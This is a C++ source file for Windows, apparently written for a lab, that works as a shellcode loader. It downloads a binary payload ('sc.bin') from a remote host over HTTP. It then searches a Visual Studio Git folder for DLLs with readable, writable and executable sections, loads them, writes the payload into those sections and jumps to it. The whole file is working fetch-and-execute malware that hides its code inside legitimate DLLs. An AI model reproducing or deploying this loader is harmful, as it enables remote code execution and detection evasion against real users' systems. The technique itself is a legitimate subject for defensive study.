#include <Windows.h>
#include <iostream>
#include <filesystem>
#include <fstream>
#include <vector>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

using namespace std;

struct sVulnSection {
    filesystem::path dllPath;
    IMAGE_NT_HEADERS PEHeader;
    IMAGE_SECTION_HEADER peSection;
};

vector<sVulnSection> vulnSections;
vector<filesystem::path> dllPaths;

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    HINTERNET hSession = WinHttpOpen(NULL, 
                                     WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, 
                                     WINHTTP_NO_PROXY_NAME, 
                                     WINHTTP_NO_PROXY_BYPASS, 
                                     0);

    HINTERNET hConnect = WinHttpConnect(hSession,
                                        baseAddress,
                                        8080,//INTERNET_DEFAULT_HTTP_PORT,
                                        0);

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, 
                                            L"GET", 
                                            filename, 
                                            NULL, 
                                            WINHTTP_NO_REFERER, 
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                            NULL);


    /*
    DWORD secFlags = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS;
    WinHttpSetOption(hRequest, 
                     WINHTTP_OPTION_SECURITY_FLAGS, 
                     &secFlags, 
                     sizeof(secFlags)); //IGNORING CERT ISSUES (Lab Only)
    */

    WinHttpSendRequest(hRequest, 
                       WINHTTP_NO_ADDITIONAL_HEADERS, 
                       0, 
                       WINHTTP_NO_REQUEST_DATA, 
                       0, 
                       0, 
                       0);

    WinHttpReceiveResponse(hRequest, NULL);

    do {
        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }
    } while (bytesRead > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

void getDLLSectionInfo(const filesystem::path dllPath) {

    std::ifstream dll(dllPath, ios::binary);
    IMAGE_DOS_HEADER dosHeader;
    IMAGE_NT_HEADERS peHeader;
    IMAGE_SECTION_HEADER peSection;
  
    if (dll.is_open()) {
        dll.seekg(0, ios::beg);
        dll.read(reinterpret_cast<char*>(&dosHeader), sizeof(dosHeader));

        if (dosHeader.e_magic == 0x5a4d)
        {
            dll.seekg(dosHeader.e_lfanew, ios::beg); //Necesita reparacion
            dll.read(reinterpret_cast<char*>(&peHeader), sizeof(peHeader));
            if (peHeader.Signature == 0x00004550) {
                dll.seekg(dosHeader.e_lfanew + (peHeader.FileHeader.Machine == 0x8664?sizeof(IMAGE_NT_HEADERS64):sizeof(IMAGE_NT_HEADERS32)), ios::beg);
                for (int i = 0; i < peHeader.FileHeader.NumberOfSections; i++)
                {
                    dll.read(reinterpret_cast<char*>(&peSection), sizeof(peSection));

                    if ((peSection.Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)) == (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)) {
                        cout << dllPath.string() << " Vulnerable at Section " << peSection.Name << endl;
                        vulnSections.push_back({ dllPath, peHeader, peSection });
                    }
                }
            }
        }
    }
}

void listDirectoriesAndDLLs(const filesystem::path& basePath) {
    try {

        for (const auto& entry : filesystem::directory_iterator(basePath)) {
            if (entry.is_directory()) {
                listDirectoriesAndDLLs(entry.path());
            }
            else if (entry.path().extension() == ".dll")
            {
                dllPaths.push_back(entry.path());
            }
        }
    }
    catch (const filesystem::filesystem_error& ex) {
        //Just to Ignore
    }
}

int main() {

    dllPaths.clear();
    vulnSections.clear();

    std::vector<BYTE> sc = Download(L"192.168.146.129\0", L"sc.bin\0");
    unsigned int pos = 0;

    //listDirectoriesAndDLLs("C:\\");
    listDirectoriesAndDLLs("C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin");

    for (const filesystem::path dll : dllPaths)
        getDLLSectionInfo(dll);

    for (const sVulnSection vulnSection : vulnSections){
        HMODULE vulnModule = LoadLibrary(vulnSection.dllPath.c_str());

        if (vulnSection.peSection.SizeOfRawData >= sc.size()) {
            LPBYTE vulnRegion = (LPBYTE)((uintptr_t)vulnModule + (uintptr_t)vulnSection.peSection.VirtualAddress);

            for (const BYTE b : sc) {
                *vulnRegion++ = b;
            }

            (*(void(*)())((uintptr_t)vulnModule + (uintptr_t)vulnSection.peSection.VirtualAddress))();
        }
    }

	return 0;
}
